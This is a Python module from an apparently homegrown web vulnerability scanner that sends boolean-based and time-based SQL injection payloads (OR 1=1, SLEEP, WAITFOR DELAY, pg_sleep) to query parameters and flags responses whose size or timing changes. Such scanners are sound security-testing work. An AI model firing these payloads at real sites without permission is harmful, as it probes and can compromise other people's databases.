"""SQL Injection attack module - Boolean-based and Time-based detection."""
from typing import Dict, List
import time
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from .base import BaseAttackModule


class SQLiModule(BaseAttackModule):
    """Detects SQL injection vulnerabilities."""
    
    # Boolean-based payloads
    BOOLEAN_PAYLOADS = [
        ("' OR '1'='1", "' OR '1'='2"),  # True vs False
        ("' OR 1=1--", "' OR 1=2--"),
        ("1 OR 1=1", "1 OR 1=2"),
        ("admin' OR '1'='1'--", "admin' OR '1'='2'--"),
    ]
    
    # Time-based payloads (sleep 5 seconds)
    TIME_PAYLOADS = [
        "' OR SLEEP(5)--",
        "' AND SLEEP(5)--",
        "1' AND SLEEP(5)--",
        "; WAITFOR DELAY '00:00:05'--",  # SQL Server
        "' OR pg_sleep(5)--",  # PostgreSQL
    ]
    
    def __init__(self, config: dict):
        """Initialize SQLi module."""
        super().__init__(config)
        self.timeout = config.get('performance', {}).get('timeout', 10)
        self.diff_threshold = 100  # Byte difference threshold for boolean detection
        self.time_threshold = 4.5  # Minimum seconds for time-based detection
    
    def name(self) -> str:
        """Return module name."""
        return "sqli"
    
    def description(self) -> str:
        """Return module description."""
        return "Detects SQL injection vulnerabilities (Boolean-based and Time-based)"
    
    def check_applicable(self, parameter: dict, context: dict) -> bool:
        """Check if SQLi module should run on this parameter.
        
        Args:
            parameter: Parameter dict
            context: Context dict
        
        Returns:
            bool: True if parameter looks like it might be SQL-injectable
        """
        if not parameter.get('name'):
            return False
        
        param_name = parameter['name'].lower()
        param_value = parameter.get('value', '')
        
        # Apply to parameters that commonly interact with databases
        sql_indicators = ['id', 'search', 'query', 'filter', 'sort', 'user', 'page', 'item']
        
        if any(indicator in param_name for indicator in sql_indicators):
            return True
        
        # Apply if value looks numeric (common for database IDs)
        if param_value and param_value.isdigit():
            return True
        
        return False
    
    def scan(self, url: str, parameter: dict, session: requests.Session) -> List[Dict]:
        """Scan for SQL injection vulnerabilities.
        
        Args:
            url: URL to test
            parameter: Parameter to test
            session: Requests session
        
        Returns:
            list: Findings
        """
        findings = []
        
        # Try boolean-based SQLi
        boolean_finding = self._test_boolean_sqli(url, parameter, session)
        if boolean_finding:
            findings.append(boolean_finding)
        
        # Try time-based SQLi (only if boolean didn't find anything)
        if not boolean_finding:
            time_finding = self._test_time_sqli(url, parameter, session)
            if time_finding:
                findings.append(time_finding)
        
        return findings
    
    def _test_boolean_sqli(self, url: str, parameter: dict, session: requests.Session) -> Dict:
        """Test for boolean-based SQL injection.
        
        Args:
            url: URL to test
            parameter: Parameter to test
            session: Requests session
        
        Returns:
            dict: Finding if vulnerable, None otherwise
        """
        param_name = parameter['name']
        param_location = parameter['location']
        
        # Get baseline response
        try:
            baseline_response = session.get(url, timeout=self.timeout)
            baseline_size = len(baseline_response.content)
        except requests.exceptions.RequestException:
            return None
        
        # Test each payload pair
        for true_payload, false_payload in self.BOOLEAN_PAYLOADS:
            try:
                # Test TRUE condition
                true_url = self._inject_payload(url, param_name, true_payload, param_location)
                true_response = session.get(true_url, timeout=self.timeout)
                true_size = len(true_response.content)
                
                # Test FALSE condition
                false_url = self._inject_payload(url, param_name, false_payload, param_location)
                false_response = session.get(false_url, timeout=self.timeout)
                false_size = len(false_response.content)
                
                # Check for differential response
                size_diff = abs(true_size - false_size)
                
                if size_diff > self.diff_threshold:
                    # Found evidence of SQLi
                    evidence = (
                        f"Boolean-based SQLi detected. "
                        f"True payload size: {true_size} bytes, "
                        f"False payload size: {false_size} bytes "
                        f"(difference: {size_diff} bytes)"
                    )
                    
                    return {
                        'name': 'SQL Injection - Boolean-Based',
                        'severity': 'High',
                        'url': url,
                        'parameter': param_name,
                        'payload': true_payload,
                        'evidence': evidence
                    }
            
            except requests.exceptions.RequestException:
                continue
        
        return None
    
    def _test_time_sqli(self, url: str, parameter: dict, session: requests.Session) -> Dict:
        """Test for time-based SQL injection.
        
        Args:
            url: URL to test
            parameter: Parameter to test
            session: Requests session
        
        Returns:
            dict: Finding if vulnerable, None otherwise
        """
        param_name = parameter['name']
        param_location = parameter['location']
        
        # Test each time payload
        for payload in self.TIME_PAYLOADS:
            try:
                test_url = self._inject_payload(url, param_name, payload, param_location)
                
                start_time = time.time()
                response = session.get(test_url, timeout=self.timeout)
                elapsed = time.time() - start_time
                
                # If response took significantly longer, likely SQLi
                if elapsed >= self.time_threshold:
                    evidence = (
                        f"Time-based SQLi detected. "
                        f"Response time: {elapsed:.2f}s "
                        f"(expected delay: 5s)"
                    )
                    
                    return {
                        'name': 'SQL Injection - Time-Based',
                        'severity': 'High',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'evidence': evidence
                    }
            
            except requests.exceptions.Timeout:
                # Timeout could indicate successful injection
                return {
                    'name': 'SQL Injection - Time-Based',
                    'severity': 'High',
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': f"Request timed out (>{self.timeout}s), indicating successful time-based injection"
                }
            
            except requests.exceptions.RequestException:
                continue
        
        return None
    
    def _inject_payload(self, url: str, param_name: str, payload: str, location: str) -> str:
        """Inject payload into parameter.
        
        Args:
            url: Base URL
            param_name: Parameter name
            payload: Payload to inject
            location: Parameter location ('query' or 'body')
        
        Returns:
            str: Modified URL
        """
        parsed = urlparse(url)
        
        if location == 'query':
            # Parse existing query params
            params = parse_qs(parsed.query, keep_blank_values=True)
            
            # Inject payload
            params[param_name] = [payload]
            
            # Rebuild query string
            new_query = urlencode(params, doseq=True)
            
            # Rebuild URL
            return urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment
            ))
        
        # For body parameters, would need POST request handling
        # Simplified for GET-based SQLi testing
        return url
